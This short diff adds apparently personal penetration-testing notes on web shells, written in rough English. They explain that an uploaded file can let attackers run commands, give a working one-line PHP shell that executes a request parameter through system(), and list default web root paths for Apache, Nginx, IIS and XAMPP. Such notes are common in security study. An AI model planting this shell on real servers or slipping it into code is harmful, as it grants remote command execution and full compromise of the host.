@@ -1,0 +1,18 @@
+=== web shell ===
+
+A web shell in normally an area of an website that accepts requests that makes commands happen in the target
+
+Sometimes you can make it happen by uploading a file that is server by the webserver with the malicious request, obviously in this case you would have to first find a vulnerability to upload the file
+
+In the case of a PHP website you would simply need the script
+	
+	``<?php system($_REQUEST["cmd"]); ?>``
+
+and to do some get requests with the commands
+
+for reference there are some of the folders popular technologies use to serve files
+	Apache =>/var/www/html/
+	Nginx => /usr/local/nginx/html/
+	IIS => c:\inetpub\wwwroot\
+	XAMPP => C:\xampp\htdocs\
+
